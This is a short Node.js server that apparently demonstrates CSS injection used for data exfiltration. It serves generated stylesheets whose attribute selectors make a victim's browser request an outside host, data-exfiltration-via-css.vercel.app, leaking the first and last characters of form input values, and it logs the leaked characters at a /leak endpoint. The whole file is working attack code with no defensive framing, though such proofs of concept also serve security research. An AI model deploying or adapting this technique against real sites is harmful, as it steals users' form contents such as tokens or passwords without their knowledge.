const http = require('http')
const url = require('url')

const HOSTNAME = `https://data-exfiltration-via-css.vercel.app`

const charsToCapture = [
  0,
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'g',
  'h',
  'i',
  'l',
  'm',
  'n',
  'o',
  'p',
  'q',
  'r',
  's',
  't',
  'v',
  'w',
  'x',
  'y',
  'z',
]

const generateResponse = (response) => {
  let css =
    charsToCapture.map((char) => `input[value$="${char}"] { --e: url(${HOSTNAME}/leak?post=${char}) }\n`).join('') +
    `\ninput { background: var(--e, none) }\n\n` +
    charsToCapture.map((char) => `input[value^="${char}"] { --s: url(${HOSTNAME}/leak?pre=${char}) }\n`).join('') +
    `\ninput { border-image: var(--s, none) }`

  response.writeHead(200, { 'Content-Type': 'text/css' })
  response.write(css)
  response.end()
}

const requestHandler = (request, response) => {
  let req = url.parse(request.url, url)

  console.log('req: %s', request.url)

  switch (req.pathname) {
    case '/start':
      generateResponse(response)
      break
    case '/leak':
      if (req.query.pre) console.log('pre: %s', req.query.pre)
      if (req.query.post) console.log('post: %s', req.query.post)

      response.end()
      break
    default:
      response.end("You know I'm, I'm bad, you know it!!")
  }
}

const server = http.createServer(requestHandler)

server.listen()
